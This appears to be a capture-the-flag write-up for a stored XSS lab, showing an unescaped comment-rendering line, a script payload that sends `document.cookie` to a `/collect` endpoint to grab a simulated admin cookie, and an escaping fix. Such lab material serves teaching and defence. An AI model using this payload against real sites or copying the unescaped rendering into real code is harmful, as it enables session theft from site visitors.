# XSS — Steal the admin cookie

## Vulnerability
The `/comments` endpoint renders the `body` field directly into the HTML without escaping:
```python
comments_html += f'<div>{body}</div>'
```

This is **Stored XSS** — the malicious script is saved in the database and executes for every visitor.

## How the flag works
The comments page sets a cookie `admin_session=FLAG` via JavaScript, simulating an admin session.
The cookie is not HttpOnly, so JavaScript can read it with `document.cookie`.

## Exploit
Post a comment with this body:
```html
<script>document.location='/collect?data='+document.cookie</script>
```

When the page loads, the script runs, reads all cookies (including `admin_session`), and sends them to `/collect`.
Visit `/collect` to see the stolen data containing the flag.

## Fix
Always escape user-generated content before rendering:
```python
from markupsafe import escape
comments_html += f'<div>{escape(body)}</div>'
```

## OWASP Reference
A03:2021 — Injection (Cross-Site Scripting, Stored variant)
